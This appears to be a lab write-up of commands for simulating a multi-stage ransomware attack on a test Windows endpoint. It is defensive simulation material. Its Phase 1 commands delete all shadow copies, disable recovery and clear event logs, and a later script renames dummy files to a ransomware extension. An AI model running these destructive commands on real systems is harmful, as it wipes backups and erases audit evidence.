# Simulation Commands

The following commands were executed on the `Windows-Target` endpoint to simulate the multi-stage ransomware attack. All commands require an elevated Administrative PowerShell session.

## Prerequisites
Setup the targeted dummy directory and files:
```powershell
New-Item -ItemType Directory -Path "C:\Finance_Data" -ErrorAction SilentlyContinue
1..20 | ForEach-Object { 
    Out-File -FilePath "C:\Finance_Data\Payroll_Record_$_.txt" -InputObject "Sensitive Financial Data for Employee $_" 
}
```
## Phase 1: Defense Evasion Commands
Execute the following to simulate the dismantling of system recovery and event logging:
```DOS
:: Delete Volume Shadow Copies
vssadmin delete shadows /all /quiet

:: Disable Windows Recovery Environment
bcdedit /set {default} recoveryenabled No

:: Clear standard Windows Event Logs
wevtutil cl Application
wevtutil cl System
```
## Phase 2: Mass Encryption Simulation
Execute the following PowerShell loop to simulate the rapid renaming and "encryption" of the target files to ```.crypt```:
```powershell
# Simulate ransomware iterating through the targeted directory
$TargetFiles = Get-ChildItem -Path "C:\Finance_Data\*.txt"

foreach ($File in $TargetFiles) {
    # Simulate the time it takes to encrypt a file
    Start-Sleep -Milliseconds 500 
    
    # Append the malicious extension
    $NewName = $File.Name -replace '\.txt$', '.crypt'
    Rename-Item -Path $File.FullName -NewName $NewName
}
```
## Alternative: Automated Script Execution
To run the entire simulation as a single execution payload (as seen in the ```INC-003_Ransomware_Behavior``` report):
```powershell
powershell.exe -ExecutionPolicy Bypass -File C:\Temp\ransomware_sim.ps1
```

